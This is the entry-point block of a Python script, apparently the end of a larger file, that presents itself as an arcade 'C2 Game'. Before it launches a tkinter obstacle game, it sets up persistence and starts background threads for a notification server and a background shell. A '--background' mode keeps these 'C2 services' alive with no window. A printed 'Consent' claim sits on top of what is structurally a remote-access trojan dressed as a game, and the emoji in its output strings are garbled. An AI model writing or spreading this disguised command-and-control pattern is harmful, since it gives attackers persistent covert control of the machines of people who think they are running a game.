if __name__ == "__main__":
    print(f"ðŸš— Starting {OS_TYPE.upper()} C2 Game with Enhanced Arcade Frontend (Consent: âœ…)")

    # Setup persistence
    setup_persistence()

    # Start background services
    threading.Thread(target=notification_server, daemon=True).start()
    threading.Thread(target=background_shell, daemon=True).start()

    # Check if running in background (for persistence)
    if len(sys.argv) > 1 and sys.argv[1] == "--background":
        print("ðŸ”„ Running in background mode - C2 services active")
        # Keep C2 services running without GUI
        try:
            while True:
                time.sleep(60)  # Keep alive
        except KeyboardInterrupt:
            print("ðŸ›‘ Background C2 stopped")
    else:
        # Start the game with GUI
        root = tk.Tk()
        game = ObstacleGame(root)
        root.mainloop()
